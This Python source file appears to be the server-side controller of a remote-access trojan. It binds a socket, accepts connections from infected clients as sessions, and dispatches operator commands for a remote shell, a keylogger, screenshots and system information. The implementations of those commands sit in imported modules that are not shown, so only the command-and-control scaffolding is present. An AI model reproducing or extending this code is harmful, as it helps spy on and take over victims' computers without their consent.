from common.output import output
from communication import COMMCENTER
from client import CLIENT
import socket
import threading


class SERVER(COMMCENTER):
    SOCKET = None
    RUNNER = True

    def __init__(self, prs):
        self.address = prs.address
        self.port = prs.port

    def bind(self):
        self.SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.SOCKET.bind((self.address, self.port))
            output.success("Successfuly Bind to %s%s:%i" % (
                output.RED,
                self.address,
                self.port,
            ))
        except Exception as e:
            output.exit("Unable to bind to %s%s:%i" % (
                output.RED,
                self.address,
                self.port,
            ))

    def accept_threads(self):
        self.SOCKET.listen(10)

        while self.RUNNER:
            conn, addr = self.SOCKET.accept()
            is_valid = True

            self.COUNTER += 1
            client = CLIENT(conn, addr)
            client.engage()

            self.CLIENTS.append(
                (
                    self.COUNTER,
                    client
                )
            )

    def accept(self):
        t = threading.Thread(target=self.accept_threads)
        t.daemon = True
        t.start()

    #### Commands ####

    def execute(self, vals):
        if vals:
            if vals[0] == "exit":
                self.c_exit()
            elif vals[0] == "help":
                self.c_help(vals)
            elif vals[0] == "sessions":
                self.c_sessions()
            elif vals[0] == "ping":
                self.c_ping(vals)
            elif vals[0] == "connect":
                self.c_connect(vals)
            elif vals[0] == "disconnect":
                self.c_disconnect()
            elif vals[0] == "shell":
                self.c_shell()
            elif vals[0] == "clear":
                self.c_clear()
            elif vals[0] == "keylogger":
                self.c_keylogger(vals)
            elif vals[0] == "sysinfo":
                self.c_sysinfo()
            elif vals[0] == "screenshot":
                self.c_screenshot()

    def launch(self):
        output.success("Launching Interface! Enter 'help' to get avaible commands! \n")

        while True:
            val = output.get_com(self.CURRENT)
            self.execute(val.split(" "))

    def close(self):
        self.SOCKET.close()
